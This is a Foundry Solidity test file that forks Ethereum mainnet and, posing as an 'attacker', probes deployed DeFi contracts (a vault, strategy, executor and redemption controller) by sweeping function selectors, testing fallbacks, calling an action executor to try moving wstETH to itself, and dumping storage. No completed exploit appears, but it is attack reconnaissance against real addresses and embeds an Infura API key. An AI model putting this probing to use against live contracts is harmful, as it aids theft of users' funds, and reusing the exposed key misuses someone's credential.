// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

contract EntryPointExploit is Test {
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant STRATEGY_1 = 0x4c046975f18D60F7C7e0B38b03accA67C1a3e20F;
    address constant STRATEGY_EXECUTOR = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;
    address constant STRATEGY_STORAGE = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ScanAllFunctionSelectors() public {
        console.log("=== SCANNING ALL FUNCTION SELECTORS ===\n");

        // Try every possible entry point on Strategy

        address[] memory targets = new address[](5);
        targets[0] = STRATEGY_0;
        targets[1] = STRATEGY_EXECUTOR;
        targets[2] = STRATEGY_STORAGE;
        targets[3] = ACTION_EXECUTOR;
        targets[4] = VAULT;

        string[5] memory names = [
            "Strategy",
            "StrategyExecutor",
            "StrategyStorage",
            "ActionExecutor",
            "Vault"
        ];

        vm.startPrank(attacker);

        for (uint i = 0; i < targets.length; i++) {
            console.log("\n=== Scanning", names[i], "===");

            // Try common public entry points
            bytes4[] memory selectors = new bytes4[](25);
            selectors[0] = bytes4(keccak256("execute(address,bytes)"));
            selectors[1] = bytes4(keccak256("callExecute(address,bytes)"));
            selectors[2] = bytes4(keccak256("executeAction(bytes,uint8[],bytes32[])"));
            selectors[3] = bytes4(keccak256("executeActions(bytes[],uint8[][],bytes32[][])"));
            selectors[4] = bytes4(keccak256("executeOnStrategy(uint256,address,bytes)"));
            selectors[5] = bytes4(keccak256("multicall(bytes[])"));
            selectors[6] = bytes4(keccak256("batch(bytes[])"));
            selectors[7] = bytes4(keccak256("withdraw(address,uint256)"));
            selectors[8] = bytes4(keccak256("deposit(address,uint256)"));
            selectors[9] = bytes4(keccak256("redeem(uint256,address)"));
            selectors[10] = bytes4(keccak256("claim(address)"));
            selectors[11] = bytes4(keccak256("harvest()"));
            selectors[12] = bytes4(keccak256("compound()"));
            selectors[13] = bytes4(keccak256("rebalance()"));
            selectors[14] = bytes4(keccak256("allocate(uint256,uint256)"));
            selectors[15] = bytes4(keccak256("deallocate(uint256,uint256)"));
            selectors[16] = bytes4(keccak256("callback(bytes)"));
            selectors[17] = bytes4(keccak256("onFlashLoan(address,address,uint256,uint256,bytes)"));
            selectors[18] = bytes4(keccak256("executeOperation(address,uint256,uint256,address,bytes)"));
            selectors[19] = bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)"));
            selectors[20] = bytes4(keccak256("pancakeV3SwapCallback(int256,int256,bytes)"));
            selectors[21] = bytes4(keccak256("fallback()"));
            selectors[22] = bytes4(keccak256("receive()"));
            selectors[23] = bytes4(keccak256("delegateCall(address,bytes)"));
            selectors[24] = bytes4(keccak256("proxy(address,bytes)"));

            string[25] memory selectorNames = [
                "execute",
                "callExecute",
                "executeAction",
                "executeActions",
                "executeOnStrategy",
                "multicall",
                "batch",
                "withdraw",
                "deposit",
                "redeem",
                "claim",
                "harvest",
                "compound",
                "rebalance",
                "allocate",
                "deallocate",
                "callback",
                "onFlashLoan",
                "executeOperation",
                "uniswapV3SwapCallback",
                "pancakeV3SwapCallback",
                "fallback",
                "receive",
                "delegateCall",
                "proxy"
            ];

            for (uint j = 0; j < selectors.length; j++) {
                (bool success,) = targets[i].call(abi.encodePacked(selectors[j]));
                if (success) {
                    console.log("  SUCCESS:", selectorNames[j]);
                }
            }
        }

        vm.stopPrank();
    }

    function test_CheckVaultCallbacks() public {
        console.log("=== CHECKING VAULT CALLBACKS ===\n");

        // Vault might have flash loan callbacks or other entry points

        bytes memory vaultCode = VAULT.code;
        console.log("Vault code size:", vaultCode.length);

        // Look for callback-related selectors
        uint256 callbackCount = 0;

        // Common callback selectors
        bytes4[] memory cbSelectors = new bytes4[](5);
        cbSelectors[0] = bytes4(keccak256("executeOperation(address[],uint256[],uint256[],address,bytes)"));
        cbSelectors[1] = bytes4(keccak256("receiveFlashLoan(address[],uint256[],uint256[],bytes)"));
        cbSelectors[2] = bytes4(keccak256("onFlashLoan(address,address,uint256,uint256,bytes)"));
        cbSelectors[3] = bytes4(keccak256("uniswapV3FlashCallback(uint256,uint256,bytes)"));
        cbSelectors[4] = bytes4(keccak256("algebraFlashCallback(uint256,uint256,bytes)"));

        for (uint i = 0; i < cbSelectors.length; i++) {
            for (uint j = 0; j + 3 < vaultCode.length; j++) {
                bytes4 sel = bytes4(bytes.concat(vaultCode[j], vaultCode[j+1], vaultCode[j+2], vaultCode[j+3]));
                if (sel == cbSelectors[i]) {
                    callbackCount++;
                    console.log("Found callback selector:");
                    console.logBytes4(cbSelectors[i]);
                }
            }
        }

        console.log("\nTotal callback selectors found:", callbackCount);
    }

    function test_CheckRedemptionEntry() public {
        console.log("=== CHECKING REDEMPTION ENTRY POINTS ===\n");

        // RedemptionController has 4 DELEGATECALLs and MAX approval from Vault
        // Maybe there's a way to exploit this

        bytes memory rcCode = REDEMPTION_CONTROLLER.code;
        console.log("RedemptionController code size:", rcCode.length);

        vm.startPrank(attacker);

        // Try various entry points
        bytes4[] memory selectors = new bytes4[](15);
        selectors[0] = bytes4(keccak256("redeem(uint256,address)"));
        selectors[1] = bytes4(keccak256("rescueERC20(address,address,uint256)"));
        selectors[2] = bytes4(keccak256("addRedemption(address)"));
        selectors[3] = bytes4(keccak256("execute(address,bytes)"));
        selectors[4] = bytes4(keccak256("callback(bytes)"));
        selectors[5] = bytes4(keccak256("multicall(bytes[])"));
        selectors[6] = bytes4(keccak256("upgradeToAndCall(address,bytes)"));
        selectors[7] = bytes4(keccak256("initialize()"));
        selectors[8] = bytes4(keccak256("transferFrom(address,address,uint256)"));
        selectors[9] = bytes4(keccak256("withdraw(address,uint256)"));
        selectors[10] = bytes4(keccak256("withdrawTo(address,address,uint256)"));
        selectors[11] = bytes4(keccak256("sweep(address,address)"));
        selectors[12] = bytes4(keccak256("claim(address)"));
        selectors[13] = bytes4(keccak256("harvest()"));
        selectors[14] = bytes4(keccak256("emergencyWithdraw()"));

        string[15] memory names = [
            "redeem",
            "rescueERC20",
            "addRedemption",
            "execute",
            "callback",
            "multicall",
            "upgradeToAndCall",
            "initialize",
            "transferFrom",
            "withdraw",
            "withdrawTo",
            "sweep",
            "claim",
            "harvest",
            "emergencyWithdraw"
        ];

        console.log("Testing RedemptionController:");
        for (uint i = 0; i < selectors.length; i++) {
            (bool success,) = REDEMPTION_CONTROLLER.call(abi.encodePacked(selectors[i]));
            if (success) {
                console.log("  SUCCESS:", names[i]);
            }
        }

        vm.stopPrank();
    }

    function test_CheckStrategyFallback() public {
        console.log("=== CHECKING STRATEGY FALLBACK ===\n");

        // Check if Strategy has a fallback that delegates
        bytes memory stratCode = STRATEGY_0.code;

        // Look for typical proxy fallback pattern
        // Usually starts with CALLDATASIZE, CALLDATACOPY, and ends with DELEGATECALL

        console.log("Strategy code size:", stratCode.length);

        // Check first few bytes for proxy pattern
        if (stratCode.length >= 10) {
            console.log("First 20 bytes:");
            bytes memory first20 = new bytes(20);
            for (uint i = 0; i < 20 && i < stratCode.length; i++) {
                first20[i] = stratCode[i];
            }
            console.logBytes(first20);
        }

        // Check for receive() function (0x00)
        vm.startPrank(attacker);

        console.log("\nSending ETH to Strategy...");
        (bool success,) = STRATEGY_0.call{value: 1 wei}("");
        console.log("receive() success:", success);

        console.log("\nSending random calldata to Strategy...");
        (success,) = STRATEGY_0.call(hex"deadbeef");
        console.log("fallback() success:", success);

        vm.stopPrank();
    }

    function test_CheckActionExecutorDirect() public {
        console.log("=== CHECKING ACTIONEXECUTOR DIRECT CALL ===\n");

        // Can we call ActionExecutor directly and trick it?

        vm.startPrank(attacker);

        bytes memory actionData = abi.encode(
            wstETH,
            attacker,
            1e18
        );

        console.log("Calling ActionExecutor.executeAction directly...");
        (bool success, bytes memory data) = ACTION_EXECUTOR.call(
            abi.encodeWithSignature(
                "executeAction(bytes,uint8[],bytes32[])",
                actionData,
                new uint8[](0),
                new bytes32[](0)
            )
        );
        console.log("Success:", success);
        if (!success && data.length > 0 && data.length < 100) {
            console.log("Error:");
            console.logBytes(data);
        }

        console.log("\nCalling ActionExecutor.executeActions directly...");
        bytes[] memory callDatas = new bytes[](1);
        callDatas[0] = actionData;

        uint8[][] memory mappings = new uint8[][](1);
        mappings[0] = new uint8[](0);

        bytes32[][] memory retValues = new bytes32[][](1);
        retValues[0] = new bytes32[](0);

        (success, data) = ACTION_EXECUTOR.call(
            abi.encodeWithSignature(
                "executeActions(bytes[],uint8[][],bytes32[][])",
                callDatas,
                mappings,
                retValues
            )
        );
        console.log("Success:", success);

        vm.stopPrank();
    }

    function test_AnalyzeStrategyStorage() public view {
        console.log("=== ANALYZING STRATEGY STORAGE ===\n");

        // Check all storage slots in StrategyStorage
        for (uint i = 0; i < 30; i++) {
            bytes32 slot = vm.load(STRATEGY_STORAGE, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }
    }
}
